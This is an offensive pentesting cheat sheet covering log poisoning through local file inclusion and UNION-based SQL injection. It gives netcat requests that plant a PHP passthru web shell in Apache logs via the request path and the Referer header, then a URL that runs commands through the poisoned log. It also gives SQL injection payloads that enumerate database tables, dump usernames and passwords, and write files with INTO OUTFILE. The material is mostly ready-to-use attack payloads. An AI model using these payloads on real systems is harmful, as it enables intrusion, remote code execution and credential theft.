### Log poisoning

There are some requirements. We need to be able to read log files. In this example we are going to poison the apache log file. You can use either the success.log or the error.log

So once you have found a LFI vuln you have to inject php-code into the log file and then execute it.

**Insert php-code into the log file**

This can be done with nc or telnet.

```
nc 192.168.1.102 80
GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: 192.168.1.102
Connection: close
```

You can also add it to the error-log by making a request to a page that doesn't exists

```
nc 192.168.1.102 80
GET /AAAAAA<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: 192.168.1.102
Connection: close
```

Or in the referer parameter.

```
GET / HTTP/1.1
Referer: <? passthru($_GET[cmd]) ?>
Host: 192.168.1.159
Connection: close
```

**Execute it in the browser**

Now you can request the log-file through the LFI and see the php-code get executed.

```
http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&cmd=id
```


# sqli
- service: sql
- service: http
- tactics: enumeration
- tactics: inital_access
- tactics: exfiltration

## external resource
[sql-injection](http://securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html)

## check if you can find a row, where you can place your output  
- `http://target-ip/inj.php?id=1 union all select 1,2,3,4,5,6,7,8`

## get the version of the database  
- `http://target-ip/inj.php?id=1 union all select 1,2,3,@@version,5`

## get the current user  
- `http://target-ip/inj.php?id=1 union all select 1,2,3,user(),5`

## see all tables  
- `http://target-ip/inj.php?id=1 union all select 1,2,3,table_name,5 FROM information_schema.tables`

## get column names for a specified table  
- `http://target-ip/inj.php?id=1 union all select 1,2,3,column_name,5 FROM information_schema.columns where table_name='users'`

## concat user names and passwords (0x3a represents “:”)  
- `http://target-ip/inj.php?id=1 union all select 1,2,3,concat(name, 0x3A , password),5 from users`

## write into a file  
- `http://target-ip/inj.php?id=1 union all select 1,2,3,"content",5 into OUTFILE 'outfile'`
